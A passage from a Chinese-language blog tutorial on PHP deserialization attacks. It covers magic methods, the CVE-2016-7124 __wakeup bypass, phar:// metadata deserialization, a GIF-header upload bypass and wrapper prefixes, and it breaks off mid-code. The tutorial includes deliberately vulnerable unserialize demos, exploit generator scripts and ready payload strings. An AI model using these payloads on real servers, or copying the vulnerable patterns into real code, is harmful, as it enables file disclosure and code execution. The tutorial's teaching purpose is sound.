class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$wrong_payload</span> <span class="token operator">=</span> <span class="token string">'O:4:"game":2:{s:9:"\00*\00wanjia";s:4:"xiao";s:5:"\00*\00bo";s:6:"dragon";}'</span><span class="token punctuation">;</span><span class="token variable">$right_payload</span> <span class="token operator">=</span> <span class="token string">'O:4:"game":2:{S:9:"\00*\00wanjia";s:4:"xiao";S:5:"\00*\00bo";s:6:"dragon";}'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$right_payload</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$wrong_payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$right_payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$wrong_payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'就是这个样子'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/04/28/best-phpserialize/18.png" alt="S和s"></p><h3 id="1-1-4-存在的问题-amp-常见类型"><a href="#1-1-4-存在的问题-amp-常见类型" class="headerlink" title="1.1.4 存在的问题&amp;常见类型"></a>1.1.4 存在的问题&amp;常见类型</h3><blockquote><p>魔术方法<br>CVE-2016-7124:绕过魔法函数__wakeup（反序列化对象注入）<br>Phar反序列化<br>Session反序列化<br>反序列化字符逃逸<br>POP链<br>原生类</p></blockquote><h2 id="1-2-常见类型剖析"><a href="#1-2-常见类型剖析" class="headerlink" title="1.2  常见类型剖析"></a>1.2  常见类型剖析</h2><h3 id="1-2-1-魔术方法"><a href="#1-2-1-魔术方法" class="headerlink" title="1.2.1 魔术方法"></a>1.2.1 魔术方法</h3><pre class="line-numbers language-php+HTML"><code class="language-php+HTML">__construct：在创建对象时候初始化对象，一般用于对变量赋初值。__destruct：和构造函数相反，当对象所在函数调用完毕后执行。__toString：当对象被当做一个字符串使用时调用。__sleep：序列化对象之前就调用此方法__wakeup：反序列化恢复对象之前调用该方法__call：当调用对象中不存在的方法会自动调用该方法，会将不存在方法的名称存到$name，把不存在方法的参数存到$argument。__get：获得一个类的成员变量时调用。当访问一个不存在的属性的时候，会直接调用__get方法，并把该不存在的属性赋给__get($key)中的$key__set：设置一个类的成员变量时调用__invoke：调用函数的方式调用一个对象时的回应方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/04/28/best-phpserialize/16.png" alt="__call"></p><h4 id="demo1-综合"><a href="#demo1-综合" class="headerlink" title="demo1  综合"></a>demo1  综合</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"__construct&lt;br />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"__destruct&lt;br />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"__toString&lt;br />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"__sleep&lt;br />"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"$a"</span><span class="token punctuation">,</span><span class="token string">"$b"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"__wakeup&lt;br />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//实例化对象，自动调用__construct</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//当类被当成字符串输出，自动调用__toString</span><span class="token keyword">echo</span> <span class="token variable">$obj</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//序列化对象，调用__sleep</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">.</span><span class="token string">'&lt;br/>'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//反序列化对象，调用__wakeup</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//echo又相当于将反序列化后生成的类当做字符串输出，于是又调用__toString</span><span class="token keyword">echo</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//脚本结束，$obj和$d这两个对象均被销毁，调用两次__destruct。</span><span class="token delimiter">?></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/04/28/best-phpserialize/4.png" alt="image-20200429091236410"></p><h4 id="demo2-wakeup"><a href="#demo2-wakeup" class="headerlink" title="demo2  __wakeup"></a>demo2  __wakeup</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//flag.php(写一个有flag的文件，放在当前目录即可)</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//exp,在页面源代码里可以看到flag</span><span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//flag.php</span>    <span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="demo3-toString"><a href="#demo3-toString" class="headerlink" title="demo3  __toString"></a>demo3  __toString</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//flag.php</span>    <span class="token keyword">private</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string">'phpinfo.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//这里__tostring和__toString都可以</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token string">"good"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//exp</span><span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// O:4:"Flag":1:{s:10:"%00Flag%00file";s:8:"flag.php";}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-2-CVE-2016-7124-绕过魔法函数-wakeup"><a href="#1-2-2-CVE-2016-7124-绕过魔法函数-wakeup" class="headerlink" title="1.2.2 CVE-2016-7124:绕过魔法函数__wakeup"></a>1.2.2 CVE-2016-7124:绕过魔法函数__wakeup</h3><p>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。<br>版本限制:PHP5 &lt; 5.6.25 | PHP7 &lt; 7.0.10</p><p><strong>例题：</strong></p><p><a href="http://note.youdao.com/noteshare?id=4d3be9380c3fa674c7c8e84206bea06b&amp;sub=8395D7512365442596466DF821FF52B6" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=4d3be9380c3fa674c7c8e84206bea06b&amp;sub=8395D7512365442596466DF821FF52B6</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// show_source(__file__);</span><span class="token comment" spellcheck="true">//phpinfo();</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//flag.php</span>  <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string">'phpinfo.php'</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>       <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      exit<span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token punctuation">}</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>     <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>payload:      ?file=O:4:”Test”:2:{s:4:”file”;s:8:”flag.php”;}</p></blockquote><h3 id="1-2-3-Phar利用"><a href="#1-2-3-Phar利用" class="headerlink" title="1.2.3 Phar利用"></a>1.2.3 Phar利用</h3><p>phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:// ，php://等类似，也是一种流包装器。</p><p><strong>参考资料：</strong></p><p><strong>1、</strong> php反序列化拓展攻击详解–phar   <a href="https://xz.aliyun.com/t/6699" target="_blank" rel="noopener">https://xz.aliyun.com/t/6699</a></p><p><strong>2、</strong> PHP反序列化入门之phar   <a href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/#phar%E4%BB%8B%E7%BB%8D" target="_blank" rel="noopener">https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/#phar%E4%BB%8B%E7%BB%8D</a></p><h4 id="phar介绍"><a href="#phar介绍" class="headerlink" title="phar介绍"></a>phar介绍</h4><h5 id="phar结构"><a href="#phar结构" class="headerlink" title="phar结构"></a>phar结构</h5><p>结构：</p><blockquote><p>stub phar文件标识，格式为 xxx<?php xxx; __HALT_COMPILER();?>；<br>manifest压缩文件的属性等信息，以序列化存储；<br>contents压缩文件的内容；<br>signature签名，放在文件末尾；</p></blockquote><p>关键信息：</p><blockquote><p>• 文件标识，必须以__HALT_COMPILER();?&gt;结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；</p><p>• 反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化。</p><p>• phar生成（php.ini中phar.readonly选项设置为Off并把分号去掉）。</p></blockquote><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><blockquote><p>phar文件要能够上传到服务器端。<br>要有可用的魔术方法作为“跳板”。<br>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</p></blockquote><h5 id="Phar受影响的文件操作函数"><a href="#Phar受影响的文件操作函数" class="headerlink" title="Phar受影响的文件操作函数"></a>Phar受影响的文件操作函数</h5><p><img src="/2020/04/28/best-phpserialize/5.png" alt="影响函数"></p><h4 id="demo-phar"><a href="#demo-phar" class="headerlink" title="demo__phar"></a>demo__phar</h4><p>文件操作函数file_exists()通过phar://伪协议解析phar文件，使数据反序列化，从而调用__destruct()实现利用。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> name<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//这里如果改为eval，就成了代码执行。</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'flag'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//控制TestObject中的name变量为flag</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>payload:    </p><p>?file=phar://phar.phar</p></blockquote><h4 id="phar-bypass"><a href="#phar-bypass" class="headerlink" title="phar_bypass"></a>phar_bypass</h4><h5 id="Bypass–文件类型"><a href="#Bypass–文件类型" class="headerlink" title="Bypass–文件类型"></a>Bypass–文件类型</h5><p>加一个GIF头</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub,前面加了一个GIF头</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Bypass–phar不能出现在前面的字符"><a href="#Bypass–phar不能出现在前面的字符" class="headerlink" title="Bypass–phar不能出现在前面的字符"></a>Bypass–phar不能出现在前面的字符</h5><blockquote><p>compress.bzip2://phar://<br>compress.zlib://phar://<br>php://filter/resource=phar://</p></blockquote><h4 id="phar-upload"><a href="#phar-upload" class="headerlink" title="phar_upload"></a>phar_upload</h4><p>upload.php</p><p>上传页面要求上传文件类型为image/gif，且后缀名为.gif。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span> <span class="token string">'gif'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Upload: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Type: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Temp file: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">"upload_file/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">" already exists. "</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span 